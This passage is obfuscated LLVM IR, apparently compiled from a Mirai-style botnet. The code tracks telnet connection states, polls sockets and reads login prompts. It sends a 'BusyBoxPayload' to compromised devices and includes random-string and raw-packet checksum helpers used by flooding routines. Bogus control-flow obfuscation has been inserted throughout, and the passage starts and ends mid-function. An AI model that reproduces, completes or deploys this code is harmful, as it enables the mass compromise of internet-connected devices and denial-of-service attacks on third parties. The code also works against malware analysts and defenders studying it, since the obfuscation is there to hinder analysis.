  %1254 = sext i32 %1253 to i64
  %1255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1254
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1255, i32 0, i32 3
  %1257 = load i8, i8* %1256, align 1
  %1258 = zext i8 %1257 to i32
  %1259 = icmp ne i32 %1258, 3
  %1260 = load i32, i32* @x.77
  %1261 = load i32, i32* @y.78
  %1262 = sub i32 %1260, 1
  %1263 = mul i32 %1260, %1262
  %1264 = urem i32 %1263, 2
  %1265 = icmp eq i32 %1264, 0
  %1266 = icmp slt i32 %1261, 10
  %1267 = or i1 %1265, %1266
  br i1 %1267, label %originalBBpart2210, label %originalBB208alteredBB

originalBBpart2210:                               ; preds = %originalBB208
  br i1 %1259, label %1268, label %1269

; <label>:1268:                                   ; preds = %originalBBpart2210
  br label %1269

; <label>:1269:                                   ; preds = %1268, %originalBBpart2210
  %1270 = load i32, i32* @x.77
  %1271 = load i32, i32* @y.78
  %1272 = sub i32 %1270, 1
  %1273 = mul i32 %1270, %1272
  %1274 = urem i32 %1273, 2
  %1275 = icmp eq i32 %1274, 0
  %1276 = icmp slt i32 %1271, 10
  %1277 = or i1 %1275, %1276
  br i1 %1277, label %originalBB212, label %originalBB212alteredBB

originalBB212:                                    ; preds = %originalBB212alteredBB, %1269
  %1278 = load i32, i32* %5, align 4
  %1279 = sext i32 %1278 to i64
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1279
  call void @reset_telstate(%struct.telstate_t* %1280)
  %1281 = load i32, i32* @x.77
  %1282 = load i32, i32* @y.78
  %1283 = sub i32 %1281, 1
  %1284 = mul i32 %1281, %1283
  %1285 = urem i32 %1284, 2
  %1286 = icmp eq i32 %1285, 0
  %1287 = icmp slt i32 %1282, 10
  %1288 = or i1 %1286, %1287
  br i1 %1288, label %originalBBpart2214, label %originalBB212alteredBB

originalBBpart2214:                               ; preds = %originalBB212
  br label %1289

; <label>:1289:                                   ; preds = %originalBBpart2214, %originalBBpart2206
  br label %1290

; <label>:1290:                                   ; preds = %1289, %1130, %originalBBpart2168, %873, %808, %734, %640, %461, %originalBBpart231
  br label %1291

; <label>:1291:                                   ; preds = %1290, %originalBBpart2192, %originalBBpart2180, %originalBBpart2164, %originalBBpart2156, %858, %804, %originalBBpart2144, %originalBBpart2132, %621, %originalBBpart2120, %originalBBpart264, %331, %originalBBpart256
  %1292 = load i32, i32* @x.77
  %1293 = load i32, i32* @y.78
  %1294 = sub i32 %1292, 1
  %1295 = mul i32 %1292, %1294
  %1296 = urem i32 %1295, 2
  %1297 = icmp eq i32 %1296, 0
  %1298 = icmp slt i32 %1293, 10
  %1299 = or i1 %1297, %1298
  br i1 %1299, label %originalBB216, label %originalBB216alteredBB

originalBB216:                                    ; preds = %originalBB216alteredBB, %1291
  %1300 = load i32, i32* %5, align 4
  %1301 = add nsw i32 %1300, 1
  store i32 %1301, i32* %5, align 4
  %1302 = load i32, i32* @x.77
  %1303 = load i32, i32* @y.78
  %1304 = sub i32 %1302, 1
  %1305 = mul i32 %1302, %1304
  %1306 = urem i32 %1305, 2
  %1307 = icmp eq i32 %1306, 0
  %1308 = icmp slt i32 %1303, 10
  %1309 = or i1 %1307, %1308
  br i1 %1309, label %originalBBpart2222, label %originalBB216alteredBB

originalBBpart2222:                               ; preds = %originalBB216
  br label %189

; <label>:1310:                                   ; preds = %189
  %1311 = load i32, i32* @x.77
  %1312 = load i32, i32* @y.78
  %1313 = sub i32 %1311, 1
  %1314 = mul i32 %1311, %1313
  %1315 = urem i32 %1314, 2
  %1316 = icmp eq i32 %1315, 0
  %1317 = icmp slt i32 %1312, 10
  %1318 = or i1 %1316, %1317
  br i1 %1318, label %originalBB224, label %originalBB224alteredBB

originalBB224:                                    ; preds = %originalBB224alteredBB, %1310
  %1319 = load i32, i32* @x.77
  %1320 = load i32, i32* @y.78
  %1321 = sub i32 %1319, 1
  %1322 = mul i32 %1319, %1321
  %1323 = urem i32 %1322, 2
  %1324 = icmp eq i32 %1323, 0
  %1325 = icmp slt i32 %1320, 10
  %1326 = or i1 %1324, %1325
  br i1 %1326, label %originalBBpart2226, label %originalBB224alteredBB

originalBBpart2226:                               ; preds = %originalBB224
  br label %171
                                                  ; No predecessors!
  %1328 = load i32, i32* @x.77
  %1329 = load i32, i32* @y.78
  %1330 = sub i32 %1328, 1
  %1331 = mul i32 %1328, %1330
  %1332 = urem i32 %1331, 2
  %1333 = icmp eq i32 %1332, 0
  %1334 = icmp slt i32 %1329, 10
  %1335 = or i1 %1333, %1334
  br i1 %1335, label %originalBB228, label %originalBB228alteredBB

originalBB228:                                    ; preds = %originalBB228alteredBB, %1327
  %1336 = load i32, i32* @x.77
  %1337 = load i32, i32* @y.78
  %1338 = sub i32 %1336, 1
  %1339 = mul i32 %1336, %1338
  %1340 = urem i32 %1339, 2
  %1341 = icmp eq i32 %1340, 0
  %1342 = icmp slt i32 %1337, 10
  %1343 = or i1 %1341, %1342
  br i1 %1343, label %originalBBpart2230, label %originalBB228alteredBB

originalBBpart2230:                               ; preds = %originalBB228
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %44
  %1344 = load i32, i32* %5, align 4
  %1345 = load i32, i32* %11, align 4
  %1346 = icmp slt i32 %1344, %1345
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %64
  %1347 = load i32, i32* %5, align 4
  %1348 = sext i32 %1347 to i64
  %1349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1348
  %1350 = bitcast %struct.telstate_t* %1349 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1350, i8 0, i64 32, i32 16, i1 false)
  %1351 = load i32, i32* %5, align 4
  %1352 = sext i32 %1351 to i64
  %1353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1352
  %1354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1353, i32 0, i32 3
  store i8 1, i8* %1354, align 1
  %1355 = load i8*, i8** %17, align 8
  %1356 = load i32, i32* %5, align 4
  %1357 = sext i32 %1356 to i64
  %1358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1357
  %1359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1358, i32 0, i32 9
  store i8* %1355, i8** %1359, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %94
  %1360 = load i32, i32* %5, align 4
  %_ = sub i32 %1360, 1
  %gen = mul i32 %_, 1
  %_7 = sub i32 0, %1360
  %gen8 = add i32 %_7, 1
  %_9 = shl i32 %1360, 1
  %1361 = add nsw i32 %1360, 1
  store i32 %1361, i32* %5, align 4
  br label %originalBB6

originalBB13alteredBB:                            ; preds = %originalBB13, %113
  store i32 0, i32* %7, align 4
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %137
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %154
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %172
  store i32 0, i32* %5, align 4
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %207
  %1362 = load i32, i32* %5, align 4
  %1363 = sext i32 %1362 to i64
  %1364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1363
  %1365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1364, i32 0, i32 2
  %1366 = load i8, i8* %1365, align 8
  %1367 = zext i8 %1366 to i32
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %266
  %1368 = load i32, i32* %5, align 4
  %1369 = sext i32 %1368 to i64
  %1370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1369
  %1371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1370, i32 0, i32 5
  %1372 = load i8, i8* %1371, align 1
  %_34 = shl i8 %1372, 1
  %_35 = sub i8 %1372, 1
  %gen36 = mul i8 %_35, 1
  %_37 = sub i8 %1372, 1
  %gen38 = mul i8 %_37, 1
  %_39 = shl i8 %1372, 1
  %_40 = shl i8 %1372, 1
  %_41 = shl i8 %1372, 1
  %_42 = sub i8 0, %1372
  %gen43 = add i8 %_42, 1
  %1373 = add i8 %1372, 1
  store i8 %1373, i8* %1371, align 1
  %1374 = load i32, i32* %5, align 4
  %1375 = sext i32 %1374 to i64
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1375
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1376, i32 0, i32 4
  %1378 = load i8, i8* %1377, align 2
  %_44 = sub i8 %1378, 1
  %gen45 = mul i8 %_44, 1
  %_46 = shl i8 %1378, 1
  %_47 = sub i8 %1378, 1
  %gen48 = mul i8 %_47, 1
  %_49 = sub i8 0, %1378
  %gen50 = add i8 %_49, 1
  %1379 = add i8 %1378, 1
  store i8 %1379, i8* %1377, align 2
  %1380 = load i32, i32* %5, align 4
  %1381 = sext i32 %1380 to i64
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1381
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1382, i32 0, i32 5
  %1384 = load i8, i8* %1383, align 1
  %1385 = zext i8 %1384 to i64
  %1386 = icmp eq i64 %1385, 1
  br label %originalBB33

originalBB54alteredBB:                            ; preds = %originalBB54, %302
  %1387 = load i32, i32* %5, align 4
  %1388 = sext i32 %1387 to i64
  %1389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1388
  %1390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1389, i32 0, i32 3
  store i8 1, i8* %1390, align 1
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %337
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %378
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %421
  %1391 = load i32, i32* %5, align 4
  %1392 = sext i32 %1391 to i64
  %1393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1392
  call void @reset_telstate(%struct.telstate_t* %1393)
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %441
  %1394 = load i32, i32* %5, align 4
  %1395 = sext i32 %1394 to i64
  %1396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1395
  call void @advance_state(%struct.telstate_t* %1396, i32 1)
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %462
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %489
  %1397 = load i32, i32* %5, align 4
  %1398 = sext i32 %1397 to i64
  %1399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1398
  %1400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1399, i32 0, i32 0
  %1401 = load i32, i32* %1400, align 16
  %_79 = sub i32 0, %1401
  %gen80 = add i32 %_79, 64
  %1402 = srem i32 %1401, 64
  %1403 = zext i32 %1402 to i64
  %_81 = shl i64 1, %1403
  %_82 = sub i64 0, 1
  %gen83 = add i64 %_82, %1403
  %_84 = shl i64 1, %1403
  %_85 = shl i64 1, %1403
  %_86 = sub i64 0, 1
  %gen87 = add i64 %_86, %1403
  %_88 = shl i64 1, %1403
  %_89 = sub i64 1, %1403
  %gen90 = mul i64 %_89, %1403
  %_91 = shl i64 1, %1403
  %_92 = shl i64 1, %1403
  %1404 = shl i64 1, %1403
  %1405 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %1406 = load i32, i32* %5, align 4
  %1407 = sext i32 %1406 to i64
  %1408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1407
  %1409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1408, i32 0, i32 0
  %1410 = load i32, i32* %1409, align 16
  %_93 = sub i32 %1410, 64
  %gen94 = mul i32 %_93, 64
  %_95 = sub i32 %1410, 64
  %gen96 = mul i32 %_95, 64
  %_97 = shl i32 %1410, 64
  %_98 = sub i32 %1410, 64
  %gen99 = mul i32 %_98, 64
  %_100 = shl i32 %1410, 64
  %_101 = shl i32 %1410, 64
  %_102 = sub i32 %1410, 64
  %gen103 = mul i32 %_102, 64
  %1411 = sdiv i32 %1410, 64
  %1412 = sext i32 %1411 to i64
  %1413 = getelementptr inbounds [16 x i64], [16 x i64]* %1405, i64 0, i64 %1412
  %1414 = load i64, i64* %1413, align 8
  %_104 = shl i64 %1414, %1404
  %_105 = sub i64 0, %1414
  %gen106 = add i64 %_105, %1404
  %_107 = sub i64 0, %1414
  %gen108 = add i64 %_107, %1404
  %1415 = or i64 %1414, %1404
  store i64 %1415, i64* %1413, align 8
  %1416 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %1416, align 8
  %1417 = load i32, i32* %3, align 4
  %1418 = sext i32 %1417 to i64
  %1419 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %1418, i64* %1419, align 8
  %1420 = load i32, i32* %5, align 4
  %1421 = sext i32 %1420 to i64
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1421
  %1423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1422, i32 0, i32 0
  %1424 = load i32, i32* %1423, align 16
  %_109 = shl i32 %1424, 1
  %_110 = shl i32 %1424, 1
  %1425 = add nsw i32 %1424, 1
  %1426 = call i32 @select(i32 %1425, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %1426, i32* %6, align 4
  %1427 = load i32, i32* %6, align 4
  %1428 = icmp eq i32 %1427, 1
  br label %originalBB78

originalBB114alteredBB:                           ; preds = %originalBB114, %538
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %1429 = load i32, i32* %5, align 4
  %1430 = sext i32 %1429 to i64
  %1431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1430
  %1432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1431, i32 0, i32 0
  %1433 = load i32, i32* %1432, align 16
  %1434 = bitcast i32* %15 to i8*
  %1435 = call i32 @getsockopt(i32 %1433, i32 1, i32 4, i8* %1434, i32* %14) #3
  %1436 = load i32, i32* %15, align 4
  %1437 = icmp ne i32 %1436, 0
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %585
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %602
  %1438 = load i32, i32* %6, align 4
  %1439 = icmp eq i32 %1438, -1
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %663
  %1440 = load i32, i32* %5, align 4
  %1441 = sext i32 %1440 to i64
  %1442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1441
  call void @advance_state(%struct.telstate_t* %1442, i32 0)
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %687
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %704
  %1443 = load i32, i32* %5, align 4
  %1444 = sext i32 %1443 to i64
  %1445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1444
  %1446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1445, i32 0, i32 7
  %1447 = load i32, i32* %1446, align 16
  %_135 = shl i32 %1447, 7
  %_136 = shl i32 %1447, 7
  %_137 = shl i32 %1447, 7
  %_138 = shl i32 %1447, 7
  %1448 = add i32 %1447, 7
  %1449 = zext i32 %1448 to i64
  %1450 = call i64 @time(i64* null) #3
  %1451 = icmp slt i64 %1449, %1450
  br label %originalBB134

originalBB142alteredBB:                           ; preds = %originalBB142, %760
  %1452 = load i32, i32* %5, align 4
  %1453 = sext i32 %1452 to i64
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1453
  call void @reset_telstate(%struct.telstate_t* %1454)
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %780
  %1455 = load i32, i32* %5, align 4
  %1456 = sext i32 %1455 to i64
  %1457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1456
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1457, i32 0, i32 0
  %1459 = load i32, i32* %1458, align 16
  %1460 = call i64 @send(i32 %1459, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.96, i32 0, i32 0), i64 2, i32 16384)
  %1461 = icmp slt i64 %1460, 0
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %826
  %1462 = load i32, i32* %5, align 4
  %1463 = sext i32 %1462 to i64
  %1464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1463
  %1465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1464, i32 0, i32 9
  %1466 = load i8*, i8** %1465, align 8
  %1467 = call i32 @contains_fail(i8* %1466)
  %1468 = icmp ne i32 %1467, 0
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %899
  %1469 = load i32, i32* %5, align 4
  %1470 = sext i32 %1469 to i64
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1470
  call void @reset_telstate(%struct.telstate_t* %1471)
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %919
  %1472 = load i32, i32* %5, align 4
  %1473 = sext i32 %1472 to i64
  %1474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1473
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1474, i32 0, i32 0
  %1476 = load i32, i32* %1475, align 16
  %1477 = call i64 @send(i32 %1476, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.96, i32 0, i32 0), i64 2, i32 16384)
  %1478 = icmp slt i64 %1477, 0
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %943
  %1479 = load i32, i32* %5, align 4
  %1480 = sext i32 %1479 to i64
  %1481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1480
  call void @reset_telstate(%struct.telstate_t* %1481)
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %963
  %1482 = load i32, i32* %5, align 4
  %1483 = sext i32 %1482 to i64
  %1484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1483
  call void @advance_state(%struct.telstate_t* %1484, i32 6)
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %983
  %1485 = load i32, i32* %5, align 4
  %1486 = sext i32 %1485 to i64
  %1487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1486
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1487, i32 0, i32 0
  %1489 = load i32, i32* %1488, align 16
  %1490 = load i32, i32* %3, align 4
  %1491 = load i32, i32* %5, align 4
  %1492 = sext i32 %1491 to i64
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1492
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1493, i32 0, i32 9
  %1495 = load i8*, i8** %1494, align 8
  %1496 = call i32 @read_until_response(i32 %1489, i32 %1490, i8* %1495, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %1497 = icmp ne i32 %1496, 0
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1077
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1099
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1146
  %1498 = load i32, i32* %5, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1499
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1500, i32 0, i32 0
  %1502 = load i32, i32* %1501, align 16
  %1503 = call i64 @send(i32 %1502, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.99, i32 0, i32 0), i64 7, i32 16384)
  %1504 = icmp slt i64 %1503, 0
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1171
  %1505 = load i32, i32* %5, align 4
  %1506 = sext i32 %1505 to i64
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1506
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1507, i32 0, i32 0
  %1509 = load i32, i32* %1508, align 16
  %1510 = load i8*, i8** @BusyBoxPayload, align 8
  %1511 = load i8*, i8** @BusyBoxPayload, align 8
  %1512 = call i64 @strlen(i8* %1511) #9
  %1513 = call i64 @send(i32 %1509, i8* %1510, i64 %1512, i32 16384)
  %1514 = icmp slt i64 %1513, 0
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1198
  %1515 = load i32, i32* %5, align 4
  %1516 = sext i32 %1515 to i64
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1516
  call void @reset_telstate(%struct.telstate_t* %1517)
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1218
  %1518 = load i32, i32* %5, align 4
  %1519 = sext i32 %1518 to i64
  %1520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1519
  %1521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1520, i32 0, i32 7
  %1522 = load i32, i32* %1521, align 16
  %_195 = sub i32 0, %1522
  %gen196 = add i32 %_195, 25
  %_197 = sub i32 %1522, 25
  %gen198 = mul i32 %_197, 25
  %_199 = shl i32 %1522, 25
  %_200 = sub i32 0, %1522
  %gen201 = add i32 %_200, 25
  %_202 = shl i32 %1522, 25
  %_203 = sub i32 0, %1522
  %gen204 = add i32 %_203, 25
  %1523 = add i32 %1522, 25
  %1524 = zext i32 %1523 to i64
  %1525 = call i64 @time(i64* null) #3
  %1526 = icmp slt i64 %1524, %1525
  br label %originalBB194

originalBB208alteredBB:                           ; preds = %originalBB208, %1244
  %1527 = load i32, i32* %5, align 4
  %1528 = sext i32 %1527 to i64
  %1529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1528
  %1530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1529, i32 0, i32 3
  %1531 = load i8, i8* %1530, align 1
  %1532 = zext i8 %1531 to i32
  %1533 = icmp ne i32 %1532, 3
  br label %originalBB208

originalBB212alteredBB:                           ; preds = %originalBB212, %1269
  %1534 = load i32, i32* %5, align 4
  %1535 = sext i32 %1534 to i64
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1535
  call void @reset_telstate(%struct.telstate_t* %1536)
  br label %originalBB212

originalBB216alteredBB:                           ; preds = %originalBB216, %1291
  %1537 = load i32, i32* %5, align 4
  %_217 = sub i32 0, %1537
  %gen218 = add i32 %_217, 1
  %_219 = shl i32 %1537, 1
  %1538 = add nsw i32 %1537, 1
  store i32 %1538, i32* %5, align 4
  br label %originalBB216

originalBB224alteredBB:                           ; preds = %originalBB224, %1310
  br label %originalBB224

originalBB228alteredBB:                           ; preds = %originalBB228, %1327
  br label %originalBB228
}

; Function Attrs: nounwind
declare void @srand(i32) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %35, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %38

; <label>:10:                                     ; preds = %6
  %11 = load i32, i32* @x.79
  %12 = load i32, i32* @y.80
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = call i32 @rand_cmwc()
  %20 = urem i32 %19, 26
  %21 = add i32 %20, 65
  %22 = trunc i32 %21 to i8
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  store i8 %22, i8* %26, align 1
  %27 = load i32, i32* @x.79
  %28 = load i32, i32* @y.80
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %5, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %5, align 4
  br label %6

; <label>:38:                                     ; preds = %6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %39 = call i32 @rand_cmwc()
  %_ = sub i32 %39, 26
  %gen = mul i32 %_, 26
  %_1 = sub i32 0, %39
  %gen2 = add i32 %_1, 26
  %_3 = sub i32 %39, 26
  %gen4 = mul i32 %_3, 26
  %_5 = sub i32 %39, 26
  %gen6 = mul i32 %_5, 26
  %_7 = shl i32 %39, 26
  %40 = urem i32 %39, 26
  %_8 = sub i32 %40, 65
  %gen9 = mul i32 %_8, 65
  %_10 = sub i32 %40, 65
  %gen11 = mul i32 %_10, 65
  %_12 = shl i32 %40, 65
  %41 = add i32 %40, 65
  %42 = trunc i32 %41 to i8
  %43 = load i8*, i8** %3, align 8
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i8, i8* %43, i64 %45
  store i8 %42, i8* %46, align 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = load i32, i32* @x.81
  %4 = load i32, i32* @y.82
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.81
  %15 = load i32, i32* @y.82
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %25, %originalBBpart2
  %23 = load i32, i32* %12, align 4
  %24 = icmp sgt i32 %23, 1
  br i1 %24, label %25, label %34

; <label>:25:                                     ; preds = %22
  %26 = load i16*, i16** %11, align 8
  %27 = getelementptr inbounds i16, i16* %26, i32 1
  store i16* %27, i16** %11, align 8
  %28 = load i16, i16* %26, align 2
  %29 = zext i16 %28 to i64
  %30 = load i64, i64* %13, align 8
  %31 = add i64 %30, %29
  store i64 %31, i64* %13, align 8
  %32 = load i32, i32* %12, align 4
  %33 = sub nsw i32 %32, 2
  store i32 %33, i32* %12, align 4
  br label %22

; <label>:34:                                     ; preds = %22
  %35 = load i32, i32* %12, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %37, label %44

; <label>:37:                                     ; preds = %34
  %38 = load i16*, i16** %11, align 8
  %39 = bitcast i16* %38 to i8*
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i64
  %42 = load i64, i64* %13, align 8
  %43 = add i64 %42, %41
  store i64 %43, i64* %13, align 8
  br label %44

; <label>:44:                                     ; preds = %37, %34
  br label %45

; <label>:45:                                     ; preds = %originalBBpart233, %44
  %46 = load i64, i64* %13, align 8
  %47 = lshr i64 %46, 16
  %48 = icmp ne i64 %47, 0
  br i1 %48, label %49, label %71

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* @x.81
  %51 = load i32, i32* @y.82
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = load i64, i64* %13, align 8
  %59 = and i64 %58, 65535
  %60 = load i64, i64* %13, align 8
  %61 = lshr i64 %60, 16
  %62 = add i64 %59, %61
  store i64 %62, i64* %13, align 8
  %63 = load i32, i32* @x.81
  %64 = load i32, i32* @y.82
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart233, label %originalBB1alteredBB

originalBBpart233:                                ; preds = %originalBB1
  br label %45

; <label>:71:                                     ; preds = %45
  %72 = load i64, i64* %13, align 8
  %73 = xor i64 %72, -1
  %74 = trunc i64 %73 to i16
  ret i16 %74

originalBBalteredBB:                              ; preds = %originalBB, %2
